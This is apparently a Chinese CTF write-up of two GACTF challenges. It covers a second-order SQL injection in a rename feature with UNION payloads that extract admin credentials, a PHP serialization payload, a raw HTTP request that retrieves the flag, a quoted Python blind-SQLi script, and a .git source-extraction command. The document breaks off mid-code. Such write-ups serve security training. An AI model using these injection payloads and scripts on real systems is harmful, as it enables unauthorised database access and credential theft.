<h3 id="carefuleyes"><a href="#carefuleyes" class="headerlink" title="carefuleyes"></a><strong>carefuleyes</strong></h3><blockquote>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xhds/p/12245175.html">https://www.cnblogs.com/xhds/p/12245175.html</a></p>
</blockquote>
<p>源代码:<a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a></p>
<p>与hitcon-babytrick的基本流程一样:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">获取usernam&amp;password-&gt;利用username&amp;password来反序列化-&gt;get_flag</span><br></pre></td></tr></table></figure>

<ul>
<li>获取usernam&amp;password</li>
</ul>
<p>利用的代码 <code>rename.php</code> 二次注入</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;common.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($req[<span class="string">&#x27;oldname&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($req[<span class="string">&#x27;newname&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;select * from `file` where `filename`=&#x27;<span class="subst">&#123;$req[&#x27;oldname&#x27;]&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">    $result = $db-&gt;query(<span class="string">&quot;select * from `file` where `filename`=&#x27;<span class="subst">&#123;$req[&#x27;oldname&#x27;]&#125;</span>&#x27;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($result-&gt;num_rows &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        $result = $result-&gt;fetch_assoc();</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;select * from `file` where `filename`=&#x27;<span class="subst">&#123;$result[&#x27;filename&#x27;]&#125;</span>&#x27;&quot;</span>.PHP_EOL;</span><br><span class="line">        $info = $db-&gt;query(<span class="string">&quot;select * from `file` where `filename`=&#x27;<span class="subst">&#123;$result[&#x27;filename&#x27;]&#125;</span>&#x27;&quot;</span>);</span><br><span class="line">        $info = $info-&gt;fetch_assoc();</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;oldfilename : &quot;</span>.$info[<span class="string">&#x27;filename&#x27;</span>].<span class="string">&quot; will be changed.&quot;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;old file doesn&#x27;t exists!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> ($result) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;before: &quot;</span>.$req[<span class="string">&#x27;newname&#x27;</span>].<span class="string">&quot;\n\r&quot;</span>;</span><br><span class="line">        $req[<span class="string">&#x27;newname&#x27;</span>] = basename($req[<span class="string">&#x27;newname&#x27;</span>]);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;after: &quot;</span>.$req[<span class="string">&#x27;newname&#x27;</span>].<span class="string">&quot;\n\r&quot;</span>;</span><br><span class="line">        $result[<span class="string">&#x27;filename&#x27;</span>] = addslashes($result[<span class="string">&#x27;filename&#x27;</span>]);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;update `file` set `filename`=&#x27;<span class="subst">&#123;$req[&#x27;newname&#x27;]&#125;</span>&#x27;, `oldname`=&#x27;<span class="subst">&#123;$result[&#x27;filename&#x27;]&#125;</span>&#x27; where `fid`=<span class="subst">&#123;$result[&#x27;fid&#x27;]&#125;</span>&quot;</span>.PHP_EOL;</span><br><span class="line">        $re = $db-&gt;query(<span class="string">&quot;update `file` set `filename`=&#x27;<span class="subst">&#123;$req[&#x27;newname&#x27;]&#125;</span>&#x27;, `oldname`=&#x27;<span class="subst">&#123;$result[&#x27;filename&#x27;]&#125;</span>&#x27; where `fid`=<span class="subst">&#123;$result[&#x27;fid&#x27;]&#125;</span>&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>这里有一个坑点,在本地复现时,如果用的是win10,<code>basename(&quot;\&#39;a\&#39;&quot;)</code> return<code>&#39;</code> 而在linux return <code>\&#39;a\&#39;</code></p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">get: \<span class="string">&#x27;1\&#x27;</span> //一开始传的值</span><br><span class="line">update `file` <span class="built_in">set</span> `filename`=<span class="string">&#x27;\\\&#x27;</span>1\\\<span class="string">&#x27;&#x27;</span>, `oldname`=<span class="string">&#x27;1&#x27;</span> <span class="built_in">where</span> `fid`=11 </span><br><span class="line">&gt; \<span class="string">&#x27;1\&#x27;</span>   //数据库中存的值</span><br><span class="line">select * from `file` <span class="built_in">where</span> `filename`=<span class="string">&#x27;\\\&#x27;</span>1\\\<span class="string">&#x27;&#x27;</span></span><br><span class="line">&gt;  \<span class="string">&#x27;1\&#x27;</span>	//<span class="built_in">return</span> <span class="variable">$result</span>[<span class="string">&#x27;filename&#x27;</span>]</span><br><span class="line">select * from `file` <span class="built_in">where</span> `filename`=<span class="string">&#x27;\&#x27;</span>1\<span class="string">&#x27;&#x27;</span> </span><br><span class="line">&gt; NULL      // <span class="variable">$info</span>[<span class="string">&#x27;filename&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">get \\<span class="string">&#x27;1\\&#x27;</span>  //一开始传的值</span><br><span class="line">update `file` <span class="built_in">set</span> `filename`=<span class="string">&#x27;\\\\\&#x27;</span>1\\\\\<span class="string">&#x27;&#x27;</span>, `oldname`=<span class="string">&#x27;1&#x27;</span> <span class="built_in">where</span> `fid`=11</span><br><span class="line">&gt; \\<span class="string">&#x27;1\\&#x27;</span>	//数据库中存的值</span><br><span class="line">select * from `file` <span class="built_in">where</span> `filename`=<span class="string">&#x27;\\\\\&#x27;</span>1\\\\\<span class="string">&#x27;&#x27;</span></span><br><span class="line">&gt; \\<span class="string">&#x27;1\\&#x27;</span>    //<span class="built_in">return</span> <span class="variable">$result</span>[<span class="string">&#x27;filename&#x27;</span>]</span><br><span class="line">select * from `file` <span class="built_in">where</span> `filename`=<span class="string">&#x27;\\&#x27;</span>1\\<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">&gt; error check the manual that corresponds to your MySQL server version <span class="keyword">for</span> the right syntax to use near <span class="string">&#x27;1\\&#x27;</span><span class="string">&#x27;&#x27;</span> at line 1</span><br><span class="line">// 注意此处的 1\\<span class="string">&#x27;&#x27;</span> 已经超过逃出  <span class="string">&#x27;&#x27;</span>限制</span><br></pre></td></tr></table></figure>

<p>则 payload</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">\\&#x27; union <span class="keyword">select</span> <span class="keyword">password</span>,<span class="keyword">password</span>,<span class="keyword">password</span>,<span class="keyword">password</span>,<span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> privilege= <span class="number">0x61646d696e</span> ;<span class="comment">#\\&#x27;</span></span><br><span class="line">qweqweqwe </span><br><span class="line">\\&#x27; union <span class="keyword">select</span> username,username,username,username,username <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> privilege= <span class="number">0x61646d696e</span> ;<span class="comment">#\\&#x27;</span></span><br><span class="line">XM </span><br></pre></td></tr></table></figure>

<ul>
<li>反序列化</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XCTFGG</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $method;</span><br><span class="line">    <span class="keyword">private</span> $args;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$method, $args</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;method = $method;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;args = $args;</span><br><span class="line">    &#125;</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line">$result = urlencode(serialize(<span class="keyword">new</span> XCTFGG(<span class="string">&#x27;login&#x27;</span>,[<span class="string">&#x27;XM &#x27;</span>,<span class="string">&#x27;qweqweqwe&#x27;</span>])));</span><br><span class="line">var_dump($result);</span><br></pre></td></tr></table></figure>

<ul>
<li>get_flag</li>
</ul>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/upload.php?data=O%3A6%3A%22XCTFGG%22%3A2%3A%7Bs%3A14%3A%22%00XCTFGG%00method%22%3Bs%3A5%3A%22login%22%3Bs%3A12%3A%22%00XCTFGG%00args%22%3Ba%3A2%3A%7Bi%3A0%3Bs%3A3%3A%22XM+%22%3Bi%3A1%3Bs%3A9%3A%22qweqweqwe%22%3B%7D%7D</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 202.182.118.236</span><br><span class="line"><span class="attribute">Content-Length</span>: 1334</span><br><span class="line"><span class="attribute">Cache-Control</span>: max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">Origin</span>: http://202.182.118.236</span><br><span class="line"><span class="attribute">Content-Type</span>: multipart/form-data; boundary=----WebKitFormBoundary8rNPfazXNdlq3W4y</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4231.0 Safari/537.36 Edg/86.0.615.3</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Referer</span>: http://202.182.118.236/</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary8rNPfazXNdlq3W4y</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name=&quot;upfile&quot;; filename=&quot;4.gif&quot;</span><br><span class="line"><span class="attribute">Content-Type</span>: image/gif</span><br><span class="line"></span><br><span class="line">GIF89aó ....省略</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HTTP/1.1 <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span>: nginx/1.14.2</span><br><span class="line"><span class="attribute">Date</span>: Sun, 30 Aug 2020 18:58:49 GMT</span><br><span class="line"><span class="attribute">Content-Type</span>: text/html; charset=UTF-8</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">X-Powered-By</span>: PHP/5.6.40</span><br><span class="line"><span class="attribute">Content-Length</span>: 43</span><br><span class="line"></span><br><span class="line">upload successfully!GACTF&#123;!QAZxsw2#EDCvfr4&#125;</span><br></pre></td></tr></table></figure>



<p>Y1ng 师傅的脚本 学到了❤</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment">#__author__: 颖奇L&#x27;Amore www.gem-love.com</span></span><br><span class="line"><span class="keyword">import</span> HackRequests <span class="keyword">as</span> HR</span><br><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote <span class="keyword">as</span> urlencode</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span>(<span class="params">name</span>):</span></span><br><span class="line">	hack = HR.hackRequests()</span><br><span class="line">	raw = <span class="string">&#x27;&#x27;&#x27;POST /upload.php HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 124.71.191.175</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:79.0) Gecko/20100101 Firefox/79.0</span></span><br><span class="line"><span class="string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span></span><br><span class="line"><span class="string">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="string">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=---------------------------257708923430047524191624862316</span></span><br><span class="line"><span class="string">Origin: http://124.71.191.175</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">Referer: http://124.71.191.175/</span></span><br><span class="line"><span class="string">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-----------------------------257708923430047524191624862316</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;upfile&quot;; filename=&quot;%s.jpg&quot;</span></span><br><span class="line"><span class="string">Content-Type: image/jpeg</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Y1ng</span></span><br><span class="line"><span class="string">-----------------------------257708923430047524191624862316--</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span> % name</span><br><span class="line">	proxy=(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="string">&#x27;8080&#x27;</span>)</span><br><span class="line">	hh = hack.httpraw(raw=raw, ssl=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rename</span>(<span class="params">name</span>):</span></span><br><span class="line">	url = <span class="string">&#x27;http://124.71.191.175/rename.php&#x27;</span></span><br><span class="line">	data = &#123;</span><br><span class="line">		<span class="string">&#x27;oldname&#x27;</span> : name,</span><br><span class="line">		<span class="string">&#x27;newname&#x27;</span> : <span class="string">&quot;bbbbb%d.jpg&quot;</span> % random.randint(<span class="number">1</span>,<span class="number">1000000</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	header = &#123;</span><br><span class="line">		<span class="string">&quot;Content-Type&quot;</span> : <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line">		<span class="string">&quot;Accept&quot;</span> : <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span>,</span><br><span class="line">		<span class="string">&quot;Origin&quot;</span> : <span class="string">&quot;http://124.71.191.175&quot;</span>,</span><br><span class="line">		<span class="string">&quot;Upgrade-Insecure-Requests&quot;</span> : <span class="string">&quot;1&quot;</span></span><br><span class="line">	&#125;</span><br><span class="line">	proxies=&#123;<span class="string">&#x27;http&#x27;</span>:<span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>,<span class="string">&#x27;https&#x27;</span>:<span class="string">&#x27;https://127.0.0.1:8080&#x27;</span>&#125;</span><br><span class="line">	r = req.post(url=url, data=data, headers=header)</span><br><span class="line">	<span class="keyword">if</span> <span class="string">&quot;Y1ng&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">	<span class="keyword">else</span>: </span><br><span class="line">		<span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">	sql = <span class="string">&quot;select group_concat(password) from user&quot;</span></span><br><span class="line">	res = <span class="string">&quot;&quot;</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">		low = <span class="number">32</span></span><br><span class="line">		high = <span class="number">128</span></span><br><span class="line">		mid = (low + high) // <span class="number">2</span></span><br><span class="line">		<span class="keyword">while</span> (low &lt; high):</span><br><span class="line">			name = <span class="string">f&quot;Y1ng&#x27; or ascii(substr((<span class="subst">&#123;sql&#125;</span>),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>#&quot;</span></span><br><span class="line">			upload(name)</span><br><span class="line">			rename_result = rename(name)</span><br><span class="line">			<span class="keyword">if</span> rename_result:</span><br><span class="line">				low = mid + <span class="number">1</span></span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				high = mid</span><br><span class="line">			mid = (low + high) // <span class="number">2</span></span><br><span class="line">		<span class="keyword">if</span> mid == <span class="number">32</span> <span class="keyword">or</span> mid == <span class="number">127</span>:</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		res += chr(mid)</span><br><span class="line">		print(res)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	main()	</span><br></pre></td></tr></table></figure>

<h3 id="babyshop-复现"><a href="#babyshop-复现" class="headerlink" title="babyshop[复现]"></a><strong>babyshop</strong>[复现]</h3><p><code>python .\git_extract.py  http://45.63.19.130:8010/.git/</code> 获得源代码</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/unobfuscated-phpjiami.html">https://www.leavesongs.com/PENETRATION/unobfuscated-phpjiami.html</a></p>
</blockquote>
<p>当初这题的<code>init.php</code>直接使我去世,xdebug时因为session问题,一直不行</p>
<p>9月12日复现一波,主要是<code>init.php</code>的调试过程</p>
<p>泪目,还好我源代码没删:</p>
<p>源代码此处就不粘贴了,太多了,感兴趣的老哥可以下载源代码</p>
<p>Link:<a target="_blank" rel="noopener" href="http://xzaslxr.xyz/wp-content/uploads/2020/09/45.63.19.130_8010.zip">http://xzaslxr.xyz/wp-content/uploads/2020/09/45.63.19.130_8010.zip</a></p>
<ul>
<li>代码格式化</li>
</ul>
<p>可在格式化网站进行格式化</p>
<p><a target="_blank" rel="noopener" href="http://www.jsons.cn/phpformat/">PHP代码格式化美化-在线PHP代码格式化美化工具 (jsons.cn)</a></p>
<h4 id="手动分析"><a href="#手动分析" class="headerlink" title="手动分析"></a>手动分析</h4><p>已经得到的值</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$原 = <span class="string">&quot;chr&quot;</span>;</span><br><span class="line">$虚物长度 = <span class="string">&quot;count&quot;</span>;</span><br><span class="line">$随缘 = <span class="string">&quot;rand&quot;</span>;</span><br><span class="line">$千奇百出 = <span class="string">&quot;余壶血史两恐自扩劫盏铁天&quot;</span>;</span><br><span class="line">$来者无惧 = <span class="string">&quot;余壶仍灯两恐尽天&quot;</span>;</span><br></pre></td></tr></table></figure>

<p><code>ctrl h</code> 替换上面的一些参数 , 如<code>$原(</code> =&gt; <code>chr(</code></p>
<ul>
<li><code>$虚空之数 </code></li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$虚空之数 = count(<span class="keyword">$this</span>-&gt;大宇) - count(<span class="keyword">$this</span>-&gt;大宇);  <span class="comment">// $虚空之数 = 0;  count($this-&gt;大宇) = 66</span></span><br></pre></td></tr></table></figure>

<ul>
<li><code>function 太古仓</code>  字符串第二维 等于输入参数时的第一位的数值</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> 太古仓(<span class="params">$圆点</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $虚空之数, $虚物长度;<span class="comment">//虚物长度 =  66</span></span><br><span class="line">    <span class="keyword">for</span> ($内仓侍卫 = $虚空之数; $内仓侍卫 &lt; count(<span class="keyword">$this</span>-&gt;大宇); $内仓侍卫++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;大宇[$内仓侍卫][$虚空之数] == $圆点) &#123;</span><br><span class="line">            <span class="keyword">return</span> $内仓侍卫;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $虚空之数;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>$天书, $原, $虚物长度, $异闻录, $实物长度, $寻根, $奇语切片, $出窍, $遮天之术, $虚空之数, $实打实在, $虚无缥缈;</code></li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">function</span> 融合(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $天书, $原, $虚物长度, $异闻录, $实物长度, $寻根, $奇语切片, $出窍, $遮天之术, $虚空之数, $实打实在, $虚无缥缈;</span><br><span class="line">        $天书 = <span class="keyword">array</span>(<span class="string">&quot;阿尔法&quot;</span>, <span class="string">&quot;喝彩&quot;</span>, <span class="string">&quot;查理&quot;</span>, <span class="string">&quot;三角洲&quot;</span>, <span class="string">&quot;回声&quot;</span>, <span class="string">&quot;狐步舞&quot;</span>, <span class="string">&quot;高尔夫球&quot;</span>, <span class="string">&quot;旅馆&quot;</span>, <span class="string">&quot;印度&quot;</span>, <span class="string">&quot;朱丽叶&quot;</span>, <span class="string">&quot;公斤&quot;</span>, <span class="string">&quot;利马&quot;</span>, <span class="string">&quot;麦克&quot;</span>, <span class="string">&quot;十一月&quot;</span>, <span class="string">&quot;奥斯卡&quot;</span>, <span class="string">&quot;爸爸&quot;</span>, <span class="string">&quot;魁北克&quot;</span>, <span class="string">&quot;罗密欧&quot;</span>, <span class="string">&quot;塞拉&quot;</span>, <span class="string">&quot;探戈&quot;</span>, <span class="string">&quot;制服&quot;</span>, <span class="string">&quot;胜利者&quot;</span>, <span class="string">&quot;威士忌&quot;</span>, <span class="string">&quot;伦琴射线&quot;</span>, <span class="string">&quot;扬基&quot;</span>, <span 